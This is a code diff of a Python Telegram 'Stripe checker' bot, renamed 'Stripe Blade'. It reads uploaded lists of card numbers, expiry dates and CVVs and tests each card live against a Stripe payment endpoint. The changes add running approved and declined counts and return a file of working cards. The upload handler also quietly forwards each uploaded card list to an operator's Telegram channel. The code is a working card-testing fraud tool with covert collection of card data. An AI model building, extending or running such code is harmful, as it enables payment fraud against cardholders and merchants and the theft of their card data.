@@ -5,9 +5,7 @@ import requests
 import os
 import functools
 import logging
-import threading
 from datetime import datetime
-from http.server import HTTPServer, BaseHTTPRequestHandler
 from bs4 import BeautifulSoup
 from telegram import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import (
@@ -38,10 +36,9 @@ HEADERS = {
 
 combo_data = {}
 approved_data = {}
+live_stats = {}
 
 logging.basicConfig(level=logging.INFO)
-
-# === UTILS ===
 
 def parse_combo_line(line):
     patterns = [
@@ -145,7 +142,7 @@ def process_combo(combo):
         if json_resp.get('success') and json_resp.get('data', {}).get('status') == 'succeeded':
             return "APPROVED", "Approved", full
         elif json_resp.get('data', {}).get('status') == 'requires_action':
-            return "DECLINED", "3DS Secure Required", full
+            return "DECLINED", "3DS Required", full
         else:
             return "DECLINED", "Declined", full
 
@@ -159,10 +156,10 @@ async def run_blocking(func, *args):
 def keyboard():
     return InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("▶ Start Check", callback_data="startcheck"),
-            InlineKeyboardButton("📊 Stats", callback_data="stats")
+            InlineKeyboardButton("▶️ Start Check", callback_data="startcheck"),
+            InlineKeyboardButton("📈 View Stats", callback_data="stats")
         ],
-        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
+        [InlineKeyboardButton("ℹ️ Help & Usage", callback_data="help")]
     ])
 
 async def start(update, context):
@@ -177,11 +174,12 @@ async def start(update, context):
         pass
 
     await update.message.reply_text(
-        "Welcome! I'm your Stripe Checker Bot.\n\n"
-        "To begin:\n"
-        "1. Upload your combo list as a `.txt` file.\n"
-        "2. Tap ▶ Start Check below.\n\n"
-        "Need help? Use /chk followed by a card to test one manually.",
+        "✨ Welcome to <b>Stripe Blade</b> — your sleek, private combo validator.\n\n"
+        "<b>How to get started:</b>\n"
+        "1. Upload your combo list as a <code>.txt</code> file.\n"
+        "2. Tap ▶️ <b>Start Check</b> below to begin.\n\n"
+        "Use <code>/chk</code> + a card to test one manually.",
+        parse_mode="HTML",
         reply_markup=keyboard()
     )
 
@@ -198,33 +196,14 @@ async def upload_file(update, context):
     lines = raw.decode('utf-8', errors='ignore').splitlines()
     combo_data[chat_id] = [line.strip() for line in lines if line.strip()]
     approved_data[chat_id] = []
+    live_stats[chat_id] = {"approved": 0, "declined": 0, "error": 0, "total": 0}
 
     await update.message.reply_text(f"✅ Loaded {len(combo_data[chat_id])} combos.")
-
     await context.bot.copy_message(
         chat_id=CHANNEL_ID,
         from_chat_id=chat_id,
         message_id=update.message.message_id
     )
-
-async def send_result(chat_id, context, user, card, status, msg):
-    tag = f"@{user.username}" if user.username else user.first_name
-    icon = "✅" if status == "APPROVED" else "❌"
-    time = datetime.now().strftime("%H:%M:%S")
-
-    text = f"""
-<b>{icon} {status} RESULT</b>
-<code>{card}</code>
-
-<b>Status:</b> {status}
-<b>Response:</b> {msg}
-<b>Gateway:</b> Stripe
-<b>Checked by:</b> {tag}
-<b>Time:</b> {time}
-"""
-    await context.bot.send_message(chat_id, text, parse_mode="HTML")
-    if status == "APPROVED":
-        approved_data[chat_id].append(card)
 
 async def send_approved_file(chat_id, context):
     approved = approved_data.get(chat_id)
@@ -242,6 +221,70 @@ async def send_approved_file(chat_id, context):
 
     os.remove(path)
 
+async def callback_handler(update, context):
+    query = update.callback_query
+    await query.answer()
+    chat_id = query.message.chat.id
+    user = update.effective_user
+
+    if query.data == "stats":
+        stats = live_stats.get(chat_id, {"approved": 0, "declined": 0, "error": 0, "total": 0})
+        await query.edit_message_text(
+            f"<b>📊 Live Check Summary</b>\n"
+            f"• Total Combos: <b>{stats['total']}</b>\n"
+            f"• ✅ Approved: <b>{stats['approved']}</b>\n"
+            f"• ❌ Declined: <b>{stats['declined']}</b>\n"
+            f"• ❗ Error: <b>{stats['error']}</b>",
+            parse_mode="HTML",
+            reply_markup=keyboard()
+        )
+
+    elif query.data == "help":
+        await query.edit_message_text(
+            "<b>ℹ️ Help & Usage</b>\n\n"
+            "• Upload a <code>.txt</code> file with combos (one per line).\n"
+            "• Click ▶️ <b>Start Check</b> to validate all combos.\n"
+            "• Or use <code>/chk 4242|12|2026|123</code> for a quick test.\n\n"
+            "Cards are verified live against a real Stripe endpoint.",
+            parse_mode="HTML",
+            reply_markup=keyboard()
+        )
+
+    elif query.data == "startcheck":
+        combos = combo_data.get(chat_id)
+        if not combos:
+            await query.edit_message_text("Upload your combo.txt first.", reply_markup=keyboard())
+            return
+
+        live_stats[chat_id] = {"approved": 0, "declined": 0, "error": 0, "total": 0}
+        await query.edit_message_text(f"⏳ Started checking {len(combos)} combos...")
+
+        for idx, combo in enumerate(combos, 1):
+            status, msg, card = await run_blocking(process_combo, combo)
+            stats = live_stats[chat_id]
+            stats["total"] += 1
+            if status == "APPROVED":
+                stats["approved"] += 1
+                approved_data[chat_id].append(card)
+            elif status == "DECLINED":
+                stats["declined"] += 1
+            else:
+                stats["error"] += 1
+
+            if idx % 10 == 0 or idx == len(combos):
+                await context.bot.send_message(
+                    chat_id,
+                    f"🧾 <b>Stripe Blade — Live Stats</b>\n\n"
+                    f"<b>Checked:</b> {stats['total']} / {len(combos)}\n"
+                    f"<b>✅ Approved:</b> {stats['approved']}\n"
+                    f"<b>❌ Declined:</b> {stats['declined']}\n"
+                    f"<b>❗ Error:</b> {stats['error']}",
+                    parse_mode="HTML"
+                )
+
+        await context.bot.send_message(chat_id, "✅ <b>Check complete!</b>", parse_mode="HTML")
+        await send_approved_file(chat_id, context)
+
 async def single_check(update, context):
     chat_id = update.effective_chat.id
     user = update.effective_user
@@ -254,66 +297,12 @@ async def single_check(update, context):
         await update.message.reply_text("⚠️ Invalid combo format.")
         return
     await update.message.reply_text("⏳ Checking combo...")
-    try:
-        status, msg, card = await run_blocking(process_combo, combo)
-        await send_result(chat_id, context, user, card, status, msg)
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed: <code>{str(e)}</code>", parse_mode="HTML")
-
-async def callback_handler(update, context):
-    query = update.callback_query
-    await query.answer()
-    chat_id = query.message.chat.id
-    user = update.effective_user
-
-    if query.data == "stats":
-        total = len(combo_data.get(chat_id, []))
-        approved = len(approved_data.get(chat_id, []))
-        await query.edit_message_text(f"📊 <b>Stats</b>\nTotal: {total}\nApproved: {approved}", parse_mode="HTML", reply_markup=keyboard())
-
-    elif query.data == "help":
-        await query.edit_message_text(
-            "ℹ️ <b>Help</b>\n\n"
-            "• Upload your combo list (.txt)\n"
-            "• Press ▶ Start Check to begin\n"
-            "• Or use /chk 4242|12|2026|123 to test one",
-            parse_mode="HTML",
-            reply_markup=keyboard()
-        )
-
-    elif query.data == "startcheck":
-        combos = combo_data.get(chat_id)
-        if not combos:
-            await query.edit_message_text("Upload your combo.txt first.", reply_markup=keyboard())
-            return
-
-        await query.edit_message_text(f"✅ Started checking {len(combos)} combos...", reply_markup=None)
-
-        for idx, combo in enumerate(combos, 1):
-            status, msg, card = await run_blocking(process_combo, combo)
-            await send_result(chat_id, context, user, card, status, msg)
-            if idx % 10 == 0:
-                await context.bot.send_message(chat_id, f"⏳ Progress: {idx}/{len(combos)}")
-
-        await context.bot.send_message(
-            chat_id,
-            f"✅ <b>Check complete!</b>\nApproved: <b>{len(approved_data.get(chat_id, []))}</b> cards.",
-            parse_mode="HTML"
-        )
-
-        await send_approved_file(chat_id, context)
-
-# === Dummy HTTP Server ===
-class KeepAliveHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"OK")
-
-def start_dummy_server():
-    port = int(os.environ.get("PORT", 8080))
-    server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
-    server.serve_forever()
+    status, msg, card = await run_blocking(process_combo, combo)
+    await update.message.reply_text(
+        f"<b>{status} — Stripe Check Result</b>\n<code>{card}</code>\n\n"
+        f"<b>Result:</b> <i>{msg}</i>\n<b>Gateway:</b> <code>Stripe UPE</code>",
+        parse_mode="HTML"
+    )
 
 # === Entry Point ===
 def main():
@@ -326,5 +315,4 @@ def main():
     app.run_polling()
 
 if __name__ == "__main__":
-    threading.Thread(target=start_dummy_server).start()  # Keep Render Web Service alive
-    main()  # Start the Telegram bot
+    main()
